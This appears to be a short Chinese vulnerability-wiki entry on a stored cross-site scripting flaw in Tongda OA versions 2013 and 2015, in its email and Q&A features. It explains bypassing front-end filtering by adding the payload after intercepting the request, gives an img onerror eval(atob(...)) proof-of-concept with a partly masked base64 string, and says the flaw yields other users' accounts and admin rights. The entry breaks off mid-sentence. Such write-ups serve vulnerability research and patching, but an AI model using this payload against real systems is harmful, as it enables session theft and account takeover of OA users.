通达oa xss
==========

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

发邮件的地方、问题问答的地⽅都存在XSS，可获取他人账号权限。⼀般情况下，OA会有前端进行过滤，
所以抓包时候去添加payload，之后会对事件进行过滤，所以使用

poc

    <img src=x onerror=eval(atob('cz1jcmVXXXXXytNYXRoXXXXXXXXhbmRvbSgp'))>

![](/Users/aresx/Documents/VulWiki/.resource/通达oaxss/media/rId24.png)

![](/Users/aresx/Documents/VulWiki/.resource/通达oaxss/media/rId25.png)

这个漏洞获取admin权限⾮
